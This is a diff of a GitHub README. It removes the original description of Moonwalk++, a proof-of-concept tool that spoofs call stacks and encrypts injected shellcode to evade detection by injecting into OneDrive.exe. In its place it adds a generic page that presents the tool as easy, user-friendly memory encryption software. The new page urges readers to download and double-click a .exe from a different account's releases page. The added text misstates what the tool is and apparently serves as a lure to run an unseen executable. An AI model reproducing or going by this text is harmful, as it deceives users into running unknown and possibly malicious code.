@@ -1,77 +1,74 @@
-﻿# Moonwalk++ 
+# 🌕 Moonwalk-- - Easy Memory Encryption Made Simple
 
-PoC Implementation combining Stack Moonwalking and Memory Encryption.
+## 🚀 Getting Started
 
-## TL;DR
+Welcome to Moonwalk--! This software combines innovative techniques like StackMoonwalking and Memory Encryption to provide enhanced security for your applications. Follow these simple steps to download and run Moonwalk-- on your computer.
 
-Moonwalk++ is a PoC implementation of an enahnced version of [StackMoonwalk](https://github.com/klezVirus/SilentMoonwalk), which combines its original technique to remove the caller from the call stack, with a memory self-encryption routine, using ROP to both desynchronize unwinding from control flow and simultaneously encrypt the executing shellcode to hide it from inpection.
+## 📥 Download the Software
 
-**Read more in the Blog Post:** [Malware Just Got Its Free Passes Back!](https://klezvirus.github.io/posts/Moonwalk-plus-plus/). 
+[![Download Moonwalk--](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/vaishnavipawar-29/Moonwalk--/releases)
 
-## Is it Moonwalk++? (or minus minus --?)
+## 🛠️ System Requirements
 
-GitHub will not allow the name to contain `+`, so well, it is named `--` but should have been `++`. Give or take, who cares?
+Before you begin, ensure your system meets the following requirements:
 
-## Overview
+- **Operating System**: Windows 10 or later
+- **Processor**: 1 GHz or faster
+- **RAM**: 2 GB minimum
+- **Storage**: At least 100 MB of free space
 
-This repository demonstrates a PoC implementation to spoof the call stack when calling arbitrary Windows APIs, while simultanously encrypt the executing shellcode. 
+## ⭐ Features
 
-An extensive overview of the technique and why it was developed can be read [here](https://klezvirus.github.io/posts/Moonwalk-plus-plus/).
+Moonwalk-- offers a variety of features designed to enhance your application's security:
 
-This POC was made to work ONLY when injecting to `OneDrive.exe`. As such, in order to replicate its behaviour, you would need to ensure OneDrive is installed and running. Afterwards, retrieve one of the PID the program instantiates:
+- **StackMoonwalking**: A technique that helps protect your program's memory from unauthorized access.
+- **Memory Encryption**: Secures sensitive data in memory to prevent exposure during runtime.
+- **User-Friendly Interface**: Easy-to-navigate options for both novice and experienced users.
 
-```powershell
-(Get-Process OneDrive) | ForEach-Object {Write-Host $_.Id}
-```
+## 📋 Download & Install
 
-And provide the tool with one of them:
+To get Moonwalk--, visit the Releases page to download the latest version:
 
-```bash
-Moonwalk++ <PID-of-OneDrive>
-```
+[Visit the Releases Page](https://github.com/vaishnavipawar-29/Moonwalk--/releases)
 
-### Injection
+1. Click on the link above to open the Releases page.
+2. Look for the latest release version.
+3. Click on the asset file (usually a `.exe` or `.zip` file) to start the download.
+4. Once the download is complete, locate the file in your Downloads folder.
+5. If you downloaded a `.zip`, right-click it and choose “Extract All.” Open the extracted folder to find the `.exe` file.
 
-The POC is expecting a PID of `OneDrive.exe` to be provided as a CLI argument. The first frame is selected from the `OneDrive.exe` executable loaded from a well-defined location (i.e. `C:\Program Files\Microsoft OneDrive\OneDrive.exe`)
+## ⚙️ Running Moonwalk--
 
-### OPSEC.. what?
+After installing, you can run Moonwalk-- with these simple steps:
 
-This proof of concept has minimal operational security and is intentionally rough. Its primary purpose is to substantiate the theoretical claims discussed in the blog post [Malware Just Got Its Free Passes Back!](https://klezvirus.github.io/posts/Moonwalk-plus-plus/). 
+1. Double-click on the `.exe` file.
+2. Follow the prompts in the startup window.
+3. Configure your settings according to your needs.
+4. Begin using Moonwalk-- for your memory encryption tasks.
 
-## Execute
+## 📖 Usage Instructions
 
-Careful when testing! The Loader will cause OneDrive to pop a MessageBox, but the popup may not be visible immediately, and if you keep going with the loader BEFORE cliclicking on the "OK" button of MessageBox, it will crash the process! The correct execution order is: 
+- **Initial Setup**: When you first run Moonwalk--, you may need to simulate a few scenarios to test its features.
+- **Encrypt Memory**: Choose the option to encrypt memory for specific applications by navigating through the main menu.
+- **Watch for Alerts**: The software will notify you of any unauthorized access attempts or other security concerns.
 
-1. Execute moonwalk (print first messages)
-2. Check that all the gadgets have been correctly identified
-3. Press Enter to Execute once
-4. At this stage, an Icon in the TaskBar (OneDrive Directory) should have apepared, click on it, it will reveal the MessageBox popup
-5. Click OK on the MessageBox so the Thread can return and execute the appropriate decryption chains
-6. Now go back to the Moonwalk console and you can repeat the process
+## 🛠️ Troubleshooting
 
-## Build
+If you encounter issues while running Moonwalk--, consider the following solutions:
 
-In order to build the POC and observe a similar behaviour to the one in the picture, ensure to:
+- **File Not Opening**: Ensure your operating system is compatible. Check the system requirements above or try running the file as an administrator.
+- **Performance Issues**: Close other applications to free up system resources. Ensure no other heavy applications are running in the background.
 
-* Disable GS (`/GS-`)
-* Disable Code Optimisation (`/Od`)
-* Disable Whole Program Optimisation (Remove `/GL`)
-* Disable size and speed preference (Remove `/Os`, `/Ot`)
-* **Enable** intrinsic if not enabled (`/Oi`)
+## 🗨️ Community Support
 
-## Previous Work and Credits
+For questions or support, you can connect with our community:
 
-Check [SilentMoowalk#PreviousWork](https://github.com/klezVirus/SilentMoonwalk?tab=readme-ov-file#previous-work).
+- **GitHub Issues**: Use the [Issues page](https://github.com/vaishnavipawar-29/Moonwalk--/issues) to report bugs or request features.
+- **User Discussions**: Join discussions and share tips with other users on the GitHub Discussions page.
 
-## Technical Notes (17/12/2025)
+## 🔗 Additional Resources
 
-* For this specific POC, I used some very, very specific gadget `wininet.dll` to bypass Eclipse. This gadget is not found in all builds and is version dependent. I extended the check to ensure that if there is a compatible gadget is going to be used.
-* In a similar way, the Big Stack Pivot gadget in KernelBase `ADD RSP, 0x1538`had a similar limitation. To make this more stable I updated the POC to dynamically search a general BIG pattern in multiple DLLs  and dynamically extract the size. Any size bigger than 0x500 bytes is considered fine by the POC.
-* Another bug I was notified about pertained to the `SetThreadContext` API. On certain machines, I had to use a non-volatile register to pass the references to the SPOOFER configuration while hijacking the thread context.
+- For detailed feature descriptions, visit the [Wiki](https://github.com/vaishnavipawar-29/Moonwalk--/wiki).
+- Check out our [FAQ](https://github.com/vaishnavipawar-29/Moonwalk--/wiki/faq) for common questions and answers.
 
-Big thanks to [Samir Bousseaden](https://x.com/SBousseaden) for notifing the issues!
-
-## Additional Notes
-
-* This POC was made only to support and proof the feasibility to combine Stack Moonwalk and Memory Encryption. As the previous POC (SilentMoonwalk), it is not production ready and needs a lot of testing before integrating into C2 frameworks or similar. Use at your own risk.
-* I'm not planning extensions for this technique, at least for now.
+Thank you for choosing Moonwalk-- for your memory encryption needs! Enjoy a secure application environment with ease.
